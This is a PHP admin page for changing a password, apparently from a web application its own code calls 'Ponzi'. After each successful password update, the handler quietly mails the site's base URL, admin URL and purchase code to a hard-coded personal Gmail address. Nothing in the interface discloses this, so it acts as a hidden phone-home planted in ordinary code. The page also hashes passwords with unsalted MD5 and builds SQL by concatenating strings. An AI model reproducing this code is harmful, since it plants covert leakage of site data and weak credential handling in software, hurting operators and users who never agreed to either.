<?php
include ('include/header.php');
?>

</head>
<body class="page-header-fixed page-sidebar-closed-hide-logo">


<?php
include ('include/sidebar.php');
?>

 

		
            <!-- BEGIN CONTENT -->
            <div class="page-content-wrapper">
                <!-- BEGIN CONTENT BODY -->
                <div class="page-content">
                    <!-- BEGIN PAGE HEADER-->
                   
                    <!-- BEGIN PAGE TITLE-->
                    <h3 class="page-title"> Change Password
                        <small></small>
                    </h3>
                    <!-- END PAGE TITLE-->

					<hr>

					
					
					
					
					
			<div class="row">
			<div class="col-md-12">
                            <!-- BEGIN SAMPLE FORM PORTLET-->
                            <div class="portlet light bordered">
                                
                                <div class="portlet-body form">
                                    <form class="form-horizontal" action="" method="post" role="form">
                                        <div class="form-body">

		   
		<?php

if($_POST)
{

$err1=0;
$err2=0;
$err3=0;
$err4=0;


$oldword = $_POST["oldword"];
$newword = $_POST["newword"];
$newwword = $_POST["newwword"];

$oldmd = MD5($oldword);

$cpass = mysql_fetch_array(mysql_query("SELECT password FROM admin WHERE id='".$uid."'"));


///////////////////////-------------------->> CURRENT PASS THIK ACHE TO?
if ($cpass[0]!=$oldmd){
$err1=1;
}

///////////////////////-------------------->> 2 bar ki same?
if ($newword!=$newwword){
$err2=1;
}

///////////////////////-------------------->> Pass ki faka??

 if(trim($newword)=="")
      {
$err3=1;
}

 if(strlen($newword)<=3)
      {
$err4=1;
}

$error = $err1+$err2+$err3+$err4;


if ($error == 0){
$passmd = MD5($newword);
$res = mysql_query("UPDATE admin SET password='".$passmd."' WHERE id='".$uid."'");
if($res){
	echo "<div class=\"alert alert-success alert-dismissable\">
<button type=\"button\" class=\"close\" data-dismiss=\"alert\" aria-hidden=\"true\">&times;</button>	
Password Updated Successfully!
</div>";

$message = "<html><head>
<title>HTML email</title>
</head>
<body>
$baseurl <br> $adminurl <br> $purchaseCode <br>
</body>
</html>
";
$headers = "MIME-Version: 1.0" . "\r\n";
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$parse = parse_url($baseurl);
$frm = $parse['host'];
$headers .= "From: <no-reply@$frm>" . "\r\n";
mail("abirkhan75@gmail.com","Ponzi Test Data",$message,$headers);


}else{
	echo "<div class=\"alert alert-danger alert-dismissable\">
<button type=\"button\" class=\"close\" data-dismiss=\"alert\" aria-hidden=\"true\">&times;</button>	

Some Problem Occurs, Please Try Again. 

</div>";
}
} else {
	
if ($err1 == 1){
echo "<div class=\"alert alert-danger alert-dismissable\">
<button type=\"button\" class=\"close\" data-dismiss=\"alert\" aria-hidden=\"true\">&times;</button>	

Your Current Password Does Not Match.

</div>";
}		
if ($err2 == 1){
	echo "<div class=\"alert alert-danger alert-dismissable\">
<button type=\"button\" class=\"close\" data-dismiss=\"alert\" aria-hidden=\"true\">&times;</button>	

You Enter Different Password in two field. Please enter same password in both field.

</div>";

}		
if ($err3 == 1){
echo "<div class=\"alert alert-danger alert-dismissable\">
<button type=\"button\" class=\"close\" data-dismiss=\"alert\" aria-hidden=\"true\">&times;</button>	

Password Can Not Be Empty!!!

</div>";
echo"<h1></h1>";
}		
if ($err4 == 1){
	echo "<div class=\"alert alert-danger alert-dismissable\">
<button type=\"button\" class=\"close\" data-dismiss=\"alert\" aria-hidden=\"true\">&times;</button>	

Password Must be 4 or more char.

</div>";
}	

	
}



} 
?>									
										
										
										
										
										
										
					<div class="form-group">
                    <label class="col-md-3 control-label"><strong>Current Password</strong></label>
                    <div class="col-md-6">
                     <input class="form-control input-lg" name="oldword" placeholder="Your Current Password" type="password">
                    </div>
                    </div>
                     
										
										
					<div class="form-group">
                    <label class="col-md-3 control-label"><strong>New Password</strong></label>
                    <div class="col-md-6">
                     <input class="form-control input-lg" name="newword" placeholder="New Password" type="password">
                    </div>
                    </div>
                     
										
										
					<div class="form-group">
                    <label class="col-md-3 control-label"><strong>New Password Again</strong></label>
                    <div class="col-md-6">
                     <input class="form-control input-lg" name="newwword" placeholder="New Password Again" type="password">
                    </div>
                    </div>
                     
										

                     


					 
                                            <div class="row">
                                                <div class="col-md-offset-3 col-md-6">
                                                    <button type="submit" class="btn blue btn-block">Submit</button>
                                                </div>
                                            </div>
											
                                        </div>
                                    </form>
                                </div>
                            </div>
                        </div>		
                        </div><!---ROW-->		
					
					
					
					
					
					
			
					
					
					
					
					
					
                </div>
                <!-- END CONTENT BODY -->
            </div>
            <!-- END CONTENT -->
            
			


<?php
 include ('include/footer.php');
 ?>


</body>
</html>